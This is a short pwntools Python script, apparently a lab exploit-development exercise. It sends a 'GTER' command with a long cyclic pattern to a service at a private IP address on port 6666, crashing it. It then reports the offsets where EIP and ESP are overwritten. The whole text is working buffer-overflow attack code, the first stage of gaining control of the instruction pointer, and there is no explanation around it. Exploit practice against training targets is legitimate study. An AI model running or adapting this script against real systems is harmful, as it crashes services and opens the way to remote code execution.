from pwn import *

def doCrash(size):
    conn = remote('192.168.145.128', 6666, typ='tcp')
    payload = "GTER /.:/" + cyclic_metasploit(size) + "\r\n"
    print("Sending: {}".format(payload))
    conn.send(payload)
    conn.close()

def getCrashBuffer(offset):
    return cyclic_metasploit_find(offset)

doCrash(1000)
print("EIP is overwritten at offset: {}".format(getCrashBuffer(0x66413066))) #151
print("ESP is overwritten at offset: {}".format(getCrashBuffer(0x32664131))) #155
print("Total buffer lenght: {}".format(getCrashBuffer(0x41376641))) #171